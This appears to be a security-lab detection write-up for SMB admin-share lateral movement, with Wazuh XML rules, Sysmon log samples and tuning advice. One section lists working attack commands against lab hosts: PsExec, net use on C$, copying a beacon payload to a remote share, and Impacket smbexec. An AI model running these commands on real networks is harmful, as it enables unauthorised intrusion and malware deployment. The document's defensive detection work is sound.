# Detection: Lateral Movement via SMB (Admin Shares)

## Threat Description

After compromising credentials, adversaries move laterally across a Windows domain using SMB (port 445) to access administrative shares (`C$`, `ADMIN$`, `IPC$`). Tools like PsExec, Impacket's `smbexec`/`wmiexec`, and native `net use` commands leverage these shares to execute payloads on remote systems or exfiltrate data.

SMB-based lateral movement is a critical stage in Active Directory compromise chains. Detecting it requires monitoring network connections to port 445 and correlating with authentication events and process creation on the target system.

## MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| **Tactic** | Lateral Movement |
| **Technique** | T1021.002 — Remote Services: SMB/Windows Admin Shares |
| **Sub-technique** | T1021.002 |

## Data Source

- **Sysmon Event ID 3** — Network Connection Detected
- **Key Fields:** `Image`, `DestinationIp`, `DestinationPort`, `User`, `SourceIp`
- **Supplementary:** Sysmon Event ID 1 (Process Creation) for PsExec service installation on target

**Note:** Sysmon Event ID 3 must be explicitly enabled in the Sysmon configuration for port 445. The SwiftOnSecurity config disables most Event ID 3 logging by default.

## Detection Logic

The rule triggers on Sysmon Event ID 3 (network connection) where:

1. Destination port is 445 (SMB)
2. The initiating process is not a known Windows system process expected to make SMB connections
3. The connection originates from a non-DC source (DC-to-member SMB is expected for GPO, replication, etc.)

A child rule elevates severity when the connection is initiated by known lateral movement tools (`psexec.exe`, `net.exe`, `cmd.exe` making outbound SMB).

## Wazuh Rule

See [wazuh-rules/lateral.xml](wazuh-rules/lateral.xml)

```xml
<group name="sysmon,lateral_movement,T1021.002,">
  <rule id="100300" level="10">
    <if_sid>61605</if_sid>
    <field name="win.eventdata.destinationPort" type="pcre2">^445$</field>
    <field name="win.eventdata.destinationIp" type="pcre2">^192\.168\.56\.</field>
    <description>SMB connection to internal host on port 445 — T1021.002</description>
    <mitre>
      <id>T1021.002</id>
    </mitre>
    <options>no_full_log</options>
  </rule>

  <rule id="100301" level="14">
    <if_sid>100300</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)(psexec|psexesvc|net\.exe|cmd\.exe)$</field>
    <description>Lateral movement tool initiating SMB connection — T1021.002</description>
    <mitre>
      <id>T1021.002</id>
    </mitre>
    <options>no_full_log</options>
  </rule>

  <rule id="100302" level="6">
    <if_sid>100300</if_sid>
    <field name="win.eventdata.image" type="pcre2">(?i)(svchost|lsass|system|ntoskrnl)\.exe$</field>
    <description>Expected system process SMB connection — suppressed</description>
    <mitre>
      <id>T1021.002</id>
    </mitre>
    <options>no_full_log</options>
  </rule>
</group>
```

## Attack Command Used

```cmd
# PsExec — remote command execution via admin share
PsExec.exe \\192.168.56.10 -u LAB\svc-admin -p Password123! cmd.exe

# Native net use — mount admin share
net use \\192.168.56.10\C$ /user:LAB\svc-admin Password123!

# Copy payload to remote system
copy C:\Temp\beacon.exe \\192.168.56.10\C$\Windows\Temp\beacon.exe

# Impacket smbexec (from Linux attacker, if applicable)
smbexec.py LAB/svc-admin:Password123!@192.168.56.10
```

## Observed Behavior in Logs

Sysmon Event ID 3 from WS01:

```
EventID: 3
Image: C:\Tools\PsExec.exe
User: LAB\svc-admin
Protocol: tcp
SourceIp: 192.168.56.20
SourcePort: 49832
DestinationIp: 192.168.56.10
DestinationPort: 445
```

Wazuh alerts generated:
- **Rule 100300** (level 10): SMB connection to internal host on port 445
- **Rule 100301** (level 14): Lateral movement tool initiating SMB connection

On the target (DC01), Sysmon Event ID 1 also captured the creation of `PSEXESVC.exe` — the PsExec service binary — which provides a secondary detection point.

## False Positives and Tuning

**Known false positives:**
- Domain Controller replication traffic (DC-to-DC SMB is expected)
- File server access from workstations (legitimate `\\fileserver\share` access)
- GPO processing on domain-joined systems generates SMB traffic to SYSVOL
- Windows Explorer browsing network shares

**Tuning recommendations:**
- Rule 100302 already suppresses known system processes — expand this list based on the environment
- In larger environments, consider excluding known DC IP pairs from the base rule to reduce noise
- The high-severity rule (100301) is the primary detection — focus tuning on the base rule (100300) to manage volume
- Implement a frequency-based child rule: a single SMB connection is ambiguous, but multiple connections to different hosts within a short window (e.g., 5 connections in 60 seconds) is a strong lateral movement indicator
- Cross-correlate with Windows Security Event ID 4624 (logon type 3 — network logon) on the target host for confirmation
